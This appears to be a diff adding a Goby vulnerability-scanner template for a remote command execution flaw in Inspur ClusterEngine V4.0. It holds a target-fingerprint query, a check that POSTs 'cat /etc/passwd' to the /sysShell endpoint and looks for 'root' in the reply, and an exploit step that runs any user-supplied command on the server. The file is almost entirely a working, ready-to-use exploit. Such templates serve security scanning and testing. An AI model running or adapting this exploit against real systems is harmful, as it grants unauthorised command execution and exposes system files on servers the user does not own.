@@ -1,0 +1,82 @@
+{
+      "Name": "ClusterEngine V4.0 Shell cluster RCE",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "body=\"ClusterEngine V4.0\"",
+      "Description": "Remote command execution exists in Inspur clusterengine v4.0. Attackers can obtain server permissions by sending special requests",
+      "Product": "ClusterEngine V4.0",
+      "Homepage": "https://en.inspur.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>Attackers can obtain server permissions by sending special requests<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "cat /etc/passwd",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/sysShell",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/sysShell",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "op=doPlease&node=cu01&command={{{Cmd}}}"
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-12 19:55:34",
+      "GobyVersion": "1.8.258"
+}
